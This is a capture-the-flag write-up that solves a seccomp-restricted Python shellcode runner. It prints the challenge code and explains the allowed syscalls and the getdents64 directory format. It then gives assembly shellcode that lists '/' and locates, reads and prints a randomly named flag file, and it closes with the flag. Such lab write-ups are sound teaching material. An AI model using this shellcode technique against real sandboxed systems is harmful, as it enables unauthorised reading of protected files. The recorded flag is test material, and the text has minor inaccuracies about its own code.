## Python is Hard - PWN
* Author : mir.ai
* Point : 497
* Difficulity : very hard
* Status : Upsolved
* Solved By : Eclair
---

#### Description
*my claude limit habis jadi enjoy whatever this is*

#### Analysis
So, I was given a python file named `chall.py` so I immediately checked it up.<br>
<br>

```python
import ctypes
import mmap
import os
import sys


MAX_SHELLCODE = 192
TRAMPOLINE_OFFSET = 256
ALLOWED_SYSCALLS = (0, 1, 2, 40, 60, 78, 217, 231, 257)

PR_SET_NO_NEW_PRIVS = 38
PR_SET_SECCOMP = 22
SECCOMP_MODE_FILTER = 2
SECCOMP_RET_KILL_PROCESS = 0x80000000
SECCOMP_RET_ALLOW = 0x7FFF0000
AUDIT_ARCH_X86_64 = 0xC000003E

BPF_LD_W_ABS = 0x20
BPF_JMP_JEQ_K = 0x15
BPF_RET_K = 0x06


class SockFilter(ctypes.Structure):
    _fields_ = [
        ("code", ctypes.c_ushort),
        ("jt", ctypes.c_ubyte),
        ("jf", ctypes.c_ubyte),
        ("k", ctypes.c_uint32),
    ]


class SockFprog(ctypes.Structure):
    _fields_ = [
        ("length", ctypes.c_ushort),
        ("filter", ctypes.POINTER(SockFilter)),
    ]


def make_filter():
    instructions = [
        SockFilter(BPF_LD_W_ABS, 0, 0, 4),
        SockFilter(BPF_JMP_JEQ_K, 1, 0, AUDIT_ARCH_X86_64),
        SockFilter(BPF_RET_K, 0, 0, SECCOMP_RET_KILL_PROCESS),
        SockFilter(BPF_LD_W_ABS, 0, 0, 0),
    ]
    for syscall_number in ALLOWED_SYSCALLS:
        instructions.append(SockFilter(BPF_JMP_JEQ_K, 0, 1, syscall_number))
        instructions.append(SockFilter(BPF_RET_K, 0, 0, SECCOMP_RET_ALLOW))
    instructions.append(SockFilter(BPF_RET_K, 0, 0, SECCOMP_RET_KILL_PROCESS))

    filter_array = (SockFilter * len(instructions))(*instructions)
    program = SockFprog(len(instructions), filter_array)
    return filter_array, program


def install_filter(filter_storage):
    filter_array, program = filter_storage
    libc = ctypes.CDLL(None, use_errno=True)
    libc.prctl.argtypes = [
        ctypes.c_int,
        ctypes.c_ulong,
        ctypes.c_void_p,
        ctypes.c_ulong,
        ctypes.c_ulong,
    ]
    libc.prctl.restype = ctypes.c_int

    if libc.prctl(PR_SET_NO_NEW_PRIVS, 1, None, 0, 0) != 0:
        raise OSError(ctypes.get_errno(), "PR_SET_NO_NEW_PRIVS failed")
    program_pointer = ctypes.cast(ctypes.pointer(program), ctypes.c_void_p)
    if libc.prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, program_pointer, 0, 0) != 0:
        raise OSError(ctypes.get_errno(), "PR_SET_SECCOMP failed")


def make_trampoline(shellcode_address):
    stack_padding = bytes.fromhex("48 83 ec 08")
    clear_stack = bytes.fromhex(
        "48 c7 04 24 00 00 00 00 48 c7 44 24 08 00 00 00 00"
    )
    zero_registers = bytes.fromhex(
        "31 c0 31 db 31 c9 31 d2 31 f6 31 ff 31 ed "
        "45 31 c0 45 31 c9 45 31 d2 45 31 db "
        "45 31 e4 45 31 ed 45 31 f6 45 31 ff"
    )
    transfer = b"\xff\x25\x00\x00\x00\x00" + shellcode_address.to_bytes(8, "little")
    return_label_offset = 1 + len(zero_registers) + len(transfer)
    load_return_address = b"\x48\x8d\x05" + return_label_offset.to_bytes(4, "little")
    push_return_address = b"\x50"
    return_exit = bytes.fromhex("31 ff b8 3c 00 00 00 0f 05 0f 0b")
    return (
        stack_padding
        + clear_stack
        + load_return_address
        + push_return_address
        + zero_registers
        + transfer
        + return_exit
    )


def main():
    output = sys.stdout.buffer
    input_stream = sys.stdin.buffer
    output.write(b"CPython shellcode runner\nshellcode length (max 192): ")
    output.flush()

    header = input_stream.readline(8)
    try:
        shellcode_length = int(header.strip(), 10)
    except ValueError:
        output.write(b"invalid length\n")
        return
    if shellcode_length < 1 or shellcode_length > MAX_SHELLCODE:
        output.write(b"length out of range\n")
        return

    shellcode = input_stream.read(shellcode_length)
    if len(shellcode) != shellcode_length:
        output.write(b"incomplete shellcode\n")
        return

    code_page = mmap.mmap(
        -1,
        mmap.PAGESIZE,
        flags=mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS,
        prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC,
    )
    code_page.write(shellcode)
    code_address = ctypes.addressof(ctypes.c_char.from_buffer(code_page))
    code_page.seek(TRAMPOLINE_OFFSET)
    code_page.write(make_trampoline(code_address))
    trampoline_address = code_address + TRAMPOLINE_OFFSET
    shellcode_entry = ctypes.CFUNCTYPE(None)(trampoline_address)

    try:
        filter_storage = make_filter()
        install_filter(filter_storage)
    except OSError as error:
        output.write(f"sandbox setup failed: {error.errno}\n".encode())
        output.flush()
        return

    shellcode_entry()
    os._exit(0)


if __name__ == "__main__":
    main()
```
<br>
So, Actually, I don't understand  the whole code but I can give you the essential.<br>
<br>

```python
def main():
    output = sys.stdout.buffer
    input_stream = sys.stdin.buffer
    output.write(b"CPython shellcode runner\nshellcode length (max 192): ")
    output.flush()

    header = input_stream.readline(8)
    try:
        shellcode_length = int(header.strip(), 10)
    except ValueError:
        output.write(b"invalid length\n")
        return
    if shellcode_length < 1 or shellcode_length > MAX_SHELLCODE:
        output.write(b"length out of range\n")
        return

    shellcode = input_stream.read(shellcode_length)
    if len(shellcode) != shellcode_length:
        output.write(b"incomplete shellcode\n")
        return

    code_page = mmap.mmap(
        -1,
        mmap.PAGESIZE,
        flags=mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS,
        prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC,
    )
    code_page.write(shellcode)
    code_address = ctypes.addressof(ctypes.c_char.from_buffer(code_page))
    code_page.seek(TRAMPOLINE_OFFSET)
    code_page.write(make_trampoline(code_address))
    trampoline_address = code_address + TRAMPOLINE_OFFSET
    shellcode_entry = ctypes.CFUNCTYPE(None)(trampoline_address)

    try:
        filter_storage = make_filter()
        install_filter(filter_storage)
    except OSError as error:
        output.write(f"sandbox setup failed: {error.errno}\n".encode())
        output.flush()
        return

    shellcode_entry()
    os._exit(0)


if __name__ == "__main__":
    main()
```
<br>

So basically in that code above, it just do something normal, it create a region with `mmap` and in that region we was allowed to `READ`, `WRITE` and `EXECUTE` so it same like in `binary file` with `NX` protection disabled, so we can inject shellcode and execute it at it.<br>

And then the code also restricted us to use certain `syscall` and allow us to use several `syscall` such as:<br>

- `0` = read<br>
- `1` = write<br>
- `2` = open<br>
- `40` = send_file<br>
- `60` = exit<br>
- `78` = getdents<br>
- `217` = getdents64<br>
- `231` = exit_group<br>
- `257` = openat<br>
<br>

Okey, so those are `syscall` that we allowed to use and I was given `Dockerfile` to check where the `flag.txt` was stored.<br>
<br>
<img width="1261" height="423" alt="image" src="https://github.com/user-attachments/assets/e0f57928-119d-453a-a505-c56649dd6ec4" /><br>
<br>

There are two information that we got from `Dockerfile`, first one `flag.txt` was stored in `root` directory and second one flag file was named with random char.<br>

So we can't use simple `ORW` technique since flag file isn't constant and if we use `*` to globbing file because `open` won't apply globbing.<br>

Then, that's why `getdents` was allowed since the function is to list directory that was opened, so we already have the execution flow.<br>

`open('/')` -> `getdents64()` -> `open('filename')` -> `read()` -> `write()`<br>
<br>

Perfect, but now we have to figure out how `getdents64` list the directory. So from the documentation `int sys_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);` that's how `getdents64` work.<br>

- `unsigned int fd` = `file descriptor` the fd was taken from the result of `open('/')`
- `struct linux_dirent64 *dirp` = basically it just where you will write the struct
- `unsigned int count` = basically just how much you want to write
<br>

and the thing we should look out is `struct linux_dirent64 *dirp` beside it just tell us where it should write the struct we need to concern what struct it will write, so the struct format would be like this:<br>

```c
struct linux_dirent64 {
    ino64_t        d_ino;     8 byte                     /* Nomor Inode 64-bit (ID unik file di hardisk) */
    loff_t         d_off;     8 byte                     /* Jarak/offset ke entri berikutnya */
    unsigned short d_reclen;  2 byte                     /* Ukuran total struktur data entri ini */
    unsigned char  d_type;    1 byte                     /* Tipe file (Regular, Direktori, Simlink, dll.) */
    char           d_name[];  depend name length of file /* Nama filenya (diakhiri karakter \0) */
};
```
<br>

and one struct is for one file, whereas in `/` directory there much filename so how we do find flag file moreover it file names was randomized.<br>
so we can't help to use filter to find flag filename and from the `Dockerfile` we know that the flag filename was `flag_<random>.txt` so it still `flag` with randomized at middle of it name.<br>
If we check `/` directory the file that its name was started with `f` is only our flag file, so we can only check the first letter of the file name. So it's perfect

#### Exploit
And I create my own exploit it would be like this
```python
shellcode = asm("""
        mov rax, 0x2f
        push rax
        mov rdi, rsp
        xor esi, esi
        mov eax, 2
        syscall

        mov edi, eax
        lea rsi, [rsp-0x500]
        mov r13, rsi
        mov edx, 0x500
        mov eax, 0xd9
        syscall

        jmp .loop

        .loop:
            movzx r12, word ptr [r13+0x10]
            cmp byte ptr [r13 + 0x13], 0x66
            jne .next
            cmp byte ptr [r13 + 0x14], 0x6c
            jne .next
            cmp byte ptr [r13 + 0x15], 0x61
            jne .next
            cmp byte ptr [r13 + 0x16], 0x67
            jne .next
            jmp .found

        .next:
            add r13, r12
            jmp .loop
        .found:

            lea rdi, [r13 + 0x13]
            mov byte ptr [rdi - 1], 0x2f
            dec rdi
            xor esi, esi
            mov eax, 2
            syscall

            mov edi, eax
            lea rsi, [r13 - 0xff]
            mov rdx, 0x30
            xor eax, eax
            syscall

            xor edi, edi
            inc edi
            xor eax, eax
            inc eax
            syscall
""")
```
From above I open `/` directory and passing `fd` to `getdents64` after write the struct on the address I want, I use comparison to find flag file using `cmp` instruction to check first letter of the filename if it was `f` or not, so if it was then surely it was flag file since there is no other file that start with `f` in `/` directory.<br>

so because of that I got the flag.<br>

FLAG: `QUAD26{gg k4mu seK4Ran6 to10N6 KeRJ41n TA s4Ya}`
